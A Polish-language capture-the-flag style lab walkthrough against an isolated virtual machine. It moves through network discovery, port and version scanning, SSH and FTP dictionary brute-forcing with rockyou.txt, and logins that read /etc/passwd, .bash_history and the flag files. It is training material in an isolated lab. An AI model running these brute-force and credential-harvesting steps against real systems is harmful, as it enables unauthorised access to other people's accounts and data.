# Przewodnik rozwiązania zadań

## Podstawowa konfiguracja
- maszyna wirtualna z systemem kali
- maszyna wirtualna SDA\
Sieć izolowana typu host-only 

## Ustalić własny adres IP wraz z maską podsieci

**Skrypt**: [network_info_final.py](network_info_final.py) wywołany bez argumentów.

```console
kali@kali:~$ python network_info_final.py
Interfejs: eth0
IP: 192.168.56.100
Maska sieci: 255.255.255.0
---------------------------
```

**Opis działania**: Skrypt robi pętlę po wykrytych w systemie interfejsach i zwraca adres IP przypisany do aktualnie iterowanego interfejsu.\
### Rozwiązanie: IP: <span style="color: green">192.168.56.100</span>, maska: <span style="color: green">255.255.255.0</span>
___
## Na podstawie powyższych informacji przeskanować sieć i ustalić adres IP celu, otwarte porty oraz ustalić nazwy oprogramowania na tych portach wraz z ich numerami wersji..
**Skrypt**: [port_scanner_final.py](port_scanner_final.py) wywołany bez argumentów.

```console
kali@kali:~$ python port_scanner_final.py
########################################
# Skanuję sieć w poszukiwaniu hostów.  #
# Interfejs: eth0                      #
# Ip: 192.168.56.100                   #
# Pomijam siebie!                      #
########################################
---------------------
IP: 192.168.56.1
Nazwa hosta: 
Status: up
Protokoły ┐
          └ TCP ┐
                ┌ Port: 22, status: open
                └ OpenSSH 8.9p1 Ubuntu 3 Ubuntu Linux; protocol 2.0
                ┌ Port: 80, status: open
                └ Apache httpd 2.4.52 (Ubuntu)
                ┌ Port: 139, status: open
                └ Samba smbd 4.6.2 
                ┌ Port: 445, status: open
                └ Samba smbd 4.6.2 
                ┌ Port: 631, status: open
                └ CUPS 2.4 
                ┌ Port: 3306, status: open
                └ MySQL  unauthorized
---------------------
IP: 192.168.56.106
Nazwa hosta: 
Status: up
Protokoły ┐
          └ TCP ┐
                ┌ Port: 21, status: open
                └ vsftpd 3.0.5 
                ┌ Port: 22, status: open
                └ OpenSSH 8.9p1 Ubuntu 3 Ubuntu Linux; protocol 2.0
                ┌ Port: 80, status: open
                └ Apache httpd 2.4.52 (Ubuntu)

```
**Opis działania**: Skrypt korzysta z poprzednio opisanego skrytpu. Na podstawie otrzymanej listy interfejsów do robi pętlę po nich i wykonuje skanowanie hostów zgodnie z maską sieciewią. Domyślnie skrypt nie wyświetla wyników skanowania portów na własnym IP.\
**Uwaga!** Jeżeli wirtualne maszyny są ustawione w trybie sieci: host-only, nie jest zwracana nazwa hosta! W trybie bridged - nazwy hostów są rozwiązywane poprawnie.
### Rozwiązanie: Adres IP celu: <span style="color: green">192.168.56.106</span>, otwarte porty:
- #### 21 - vsftpd 3.0.5 
- #### 22 - OpenSSH 8.9p1
- #### 80 - Apache httpd 2.4.52
___

## Atak brute-force na dowolną usługę

### SSH brute-force
W pierwszej kolejności przeprowadzono atak na port 22 i usługę SSH. Założono, że na atakowanej maszynie istnieje użytkownik 'root'. Słownik możliwych haseł: rockyou.txt\
**Skrypt**: [brute_force_ssh_final.py](brute_force_ssh_final.py) wywołany z argumentami:
- --host 192.168.100.56.106
- --user root
- --password /usr/share/wordlists/rockyou.txt
```console
kali@kali:~$ python brute_force_ssh_final.py --host 192.168.56.106 --user root --password /usr/share/wordlists/rockyou.txt
[!] Błędne dane logowania root:12345
[*] Przekroczono limit połączeń, ponawiam próbę root:123456789 z opóźnieniem...
[*] Przekroczono limit połączeń, ponawiam próbę root:123456789 z opóźnieniem...
[!] Błędne dane logowania root:123456789
[!] Błędne dane logowania root:password
................
[*] Przekroczono limit połączeń, ponawiam próbę root:666 z opóźnieniem...
[*] Przekroczono limit połączeń, ponawiam próbę root:666 z opóźnieniem...
[+] Określono dane dostępowe:
        Host: 192.168.56.106
        Użytkownik: root
        Hasło: 666

```
W wyniku działania skryptu zdobyto następujące poświadczenia:\
- użytkownik: **root**
- hasło: **666**

Potwierdzenie poprawności danych uzyskano poprzez próbę bezpośredniego połączenia z atakowaną maszyną:
```console
kali@kali:~$ ssh root@192.168.56.106                        
The authenticity of host '192.168.56.106 (192.168.56.106)' can't be established.
ED25519 key fingerprint is SHA256:Oh4jSTvEH3MOWXJ6sWf6a1CebgOAgf5dvE9hDmmM8CU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.106' (ED25519) to the list of known hosts.
root@192.168.56.106's password: 
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-47-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Sep 15 08:46:52 AM UTC 2022

  System load:  0.0               Processes:               136
  Usage of /:   38.2% of 9.75GB   Users logged in:         0
  Memory usage: 7%                IPv4 address for enp0s3: 192.168.56.106
  Swap usage:   0%


46 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


Last login: Fri Sep  9 06:12:02 2022 from 192.168.100.54
root@vm-sda:~# 
```
Na tym etapie porzucono eksploarację przejętej maszyny, celem podjęcia kolejnych prób brute-force.

### FTP Brute-force
**Próba nr. 1**\
Na podstawie zdobytych w punkcie wyżej poświadczeń, przeprowadzono próbę ataku na port 21 i usługę FTP.
**Skrypt**: [brute_force_ftp_final.py](brute_force_ftp_final.py) wywołany z argumentami:
- --host 192.168.100.56.106
- --user root
- --password 666
```console
kali@kali:~$ python brute_force_ftp_final.py --host 192.168.56.106 --user root --password 666
[!] Błędne dane logowania root:666 
```
Próba zakończona **niepowodzeniem**!

**Próba nr. 2**\
Podstawiono słownik z hasłami do sprawdzenia.\
**Skrypt**: [brute_force_ftp_final.py](brute_force_ftp_final.py) wywołany z argumentami:
- --host 192.168.100.56.106
- --user root
- --password /usr/share/wordlists/rockyou.txt
```console
kali@kali:~$ python brute_force_ftp_final.py --host 192.168.56.106 --user root --password /usr/share/wordlists/rockyou.txt
[!] Błędne dane logowania uranus:123456
[!] Błędne dane logowania uranus:12345
[!] Błędne dane logowania uranus:123456789
[!] Błędne dane logowania uranus:password
.............
```
Próba zakończona **niepowodzeniem**!

### Eksploracja przejętej maszyny za pośrednictwem SSH
Nawiązano połączenie ssh z atakowaną maszyną i znaleziono następujące informacje:
- plik root.txt w katalogu domowym użytkownika root zawirający flagę: **flag{1337}**
- listę innych użytkowników maszyny poprzez wylistowanie zawartości /etc/passwd
- na podstawie listy użytkowników, określono użytkownika: **uranus**
- sprawdzono historię wykonywanych komend zawartą w pliku .bash_history
```console
kali@kali:~$ ssh root@192.168.56.106
root@192.168.56.106's password: 
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-47-generic x86_64)
.................

root@vm-sda:~# ls -la
total 44
drwx------  6 root root 4096 May 10 08:28 .
drwxr-xr-x 19 root root 4096 May 10 07:04 ..
-rw-------  1 root root 1687 Sep  9 07:22 .bash_history
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 May 10 08:28 .cache
drwxr-xr-x  3 root root 4096 May 10 07:34 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   11 May 10 07:11 root.txt
drwx------  3 root root 4096 May 10 07:05 snap
drwx------  2 root root 4096 May 10 07:05 .ssh
-rw-r--r--  1 root root  209 May 10 07:27 .wget-hsts

root@vm-sda:~# cat root.txt 
flag{1337}

root@vm-sda:~# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
.................
uranus:x:1000:1000:root:/home/uranus:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
ftp:x:113:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

### SSH brute-force na użytkownika uranus
Atak na port 22 i usługę SSH. 'uranus'. Słownik możliwych haseł: rockyou.txt\
**Skrypt**: [brute_force_ssh_final.py](brute_force_ssh_final.py) wywołany z argumentami:
- --host 192.168.100.56.106
- --user uranus
- --password /usr/share/wordlists/rockyou.txt
```console
kali@kali:~$ python brute_force_ssh_final.py --host 192.168.56.106 --user uranus --password /usr/share/wordlists/rockyou.txt
[!] Błędne dane logowania uranus:123456
[!] Błędne dane logowania uranus:12345
[!] Błędne dane logowania uranus:123456789
[!] Błędne dane logowania uranus:password
[!] Błędne dane logowania uranus:iloveyou
[!] Błędne dane logowania uranus:princess
[!] Błędne dane logowania uranus:1234567
[!] Błędne dane logowania uranus:rockyou
[!] Błędne dane logowania uranus:12345678
[!] Błędne dane logowania uranus:abc123
[*] Przekroczono limit połączeń, ponawiam próbę uranus:nicole z opóźnieniem...
[!] Błędne dane logowania uranus:nicole
[*] Przekroczono limit połączeń, ponawiam próbę uranus:daniel z opóźnieniem..
[+] Określono dane dostępowe:
        Host: 192.168.56.106
        Użytkownik: uranus
        Hasło: butterfly
```
W wyniku działania skryptu zdobyto następujące poświadczenia:\
- użytkownik: **uranus**
- hasło: **butterfly**

Potwierdzenie poprawności danych uzyskano poprzez próbę bezpośredniego połączenia z atakowaną maszyną:
```console
ssh uranus@192.168.56.106                                                                
uranus@192.168.56.106's password: 
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-47-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Sep 15 09:54:30 AM UTC 2022

  System load:  0.0               Processes:               108
  Usage of /:   38.2% of 9.75GB   Users logged in:         0
  Memory usage: 6%                IPv4 address for enp0s3: 192.168.56.106
  Swap usage:   0%


46 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Sep  9 07:22:55 2022 from 192.168.100.54
uranus@vm-sda:~$ 
```
### FTP Brute-force na użytkownika uranus
Na podstawie zdobytych wcześniej poświadczeń, przeprowadzono próbę ataku na port 21 i usługę FTP.
**Skrypt**: [brute_force_ftp_final.py](brute_force_ftp_final.py) wywołany z argumentami:
- --host 192.168.100.56.106
- --user uranus
- --password butterfly
```console
kali@kali:~$ python brute_force_ftp_final.py --host 192.168.56.106 --user uranus --password butterfly
[+] Określono dane dostępowe:
        Host: 192.168.56.106
        Użytkownik: uranus
        Hasło: butterfly
```
Próba zakończona **powodzeniem**!
Sprawdzono poprawność danych poprzez użycie programu ftp dostępnego w kali.
```console
kali@kali:~$ ftp 192.168.56.106                                                        
Connected to 192.168.56.106.
220 (vsFTPd 3.0.5)
Name (192.168.56.106:kali): uranus
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /tmp
ftp> cd /home/uranus
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||6255|)
150 Here comes the directory listing.
drwxr-x---    4 1000     1000         4096 May 10 07:44 .
drwxr-xr-x    3 0        0            4096 May 10 07:05 ..
-rw-------    1 1000     1000         1529 Sep 15 09:57 .bash_history
-rw-r--r--    1 1000     1000          220 Jan 06  2022 .bash_logout
-rw-r--r--    1 1000     1000         3771 Jan 06  2022 .bashrc
drwx------    2 1000     1000         4096 May 10 07:07 .cache
-rw-r--r--    1 1000     1000          807 Jan 06  2022 .profile
drwx------    2 1000     1000         4096 May 10 07:05 .ssh
-rw-r--r--    1 1000     1000            0 May 10 07:07 .sudo_as_admin_successful
-rw-rw-r--    1 1000     1000          215 May 10 07:44 .wget-hsts
-rw-rw-r--    1 1000     1000           13 May 10 07:12 user.txt
226 Directory send OK.
ftp> exit
221 Goodbye.
```
### Eksploracja przejętej maszyny za pośrednictwem SSH dla użytkownika uranus
Nawiązano połączenie ssh z atakowaną maszyną i znaleziono następujące informacje:
- plik user.txt w katalogu domowym użytkownika uranus zawierający flagę: **flag{h4ck3r}**
- sprawdzono historię wykonywanych komend zawartą w pliku .bash_history
```console
kali@kali:~$ ssh uranus@192.168.56.106                                                                    
uranus@192.168.56.106's password: 
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-47-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Sep 15 10:06:37 AM UTC 2022

  System load:  0.0               Processes:               107
  Usage of /:   38.2% of 9.75GB   Users logged in:         0
  Memory usage: 6%                IPv4 address for enp0s3: 192.168.56.106
  Swap usage:   0%


46 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Sep 15 09:54:31 2022 from 192.168.56.100
uranus@vm-sda:~$ ls -la
total 40
drwxr-x--- 4 uranus uranus 4096 May 10 07:44 .
drwxr-xr-x 3 root   root   4096 May 10 07:05 ..
-rw------- 1 uranus uranus 1529 Sep 15 09:57 .bash_history
-rw-r--r-- 1 uranus uranus  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 uranus uranus 3771 Jan  6  2022 .bashrc
drwx------ 2 uranus uranus 4096 May 10 07:07 .cache
-rw-r--r-- 1 uranus uranus  807 Jan  6  2022 .profile
drwx------ 2 uranus uranus 4096 May 10 07:05 .ssh
-rw-r--r-- 1 uranus uranus    0 May 10 07:07 .sudo_as_admin_successful
-rw-rw-r-- 1 uranus uranus   13 May 10 07:12 user.txt
-rw-rw-r-- 1 uranus uranus  215 May 10 07:44 .wget-hsts

uranus@vm-sda:~$ cat user.txt 
flag{h4ck3r}

uranus@vm-sda:~$ cat .bash_history 
pwd
sudo su
cat /root/root.txt
sudo cat /root/root.txt
pwd
echo "flag{h4ck3r}" > user.txt
caat user.txt 
cat user.txt 
sudo su
pwd
ls -la
cat user.txt 
.....................
uranus@vm-sda:~$
```